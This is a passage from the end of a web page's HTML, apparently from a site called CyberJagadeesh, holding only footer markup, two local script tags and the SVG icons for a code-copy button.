</i>2024 CyberJagadeesh</div></section></footer><script src=/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js></script><div class="hidden top-1 right-1" id=code-copy><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667A2.667 2.667.0 019.667 7h8.666A2.667 2.667.0 0121 9.667v8.666A2.667 2.667.0 0118.333 21H9.667A2.667 2.667.0 017 18.333z"/><path d="M4.012 16.737A2.005 2.005.0 013 15V5c0-1.1.9-2 2-2h10c.75.0 1.158.385 1.5 1"/></svg></i></div><div class="hidden top-1 right-1" id=code-copy-done><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12l5 5L20 7"/></svg></i></div><script src=/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js></script></body></html>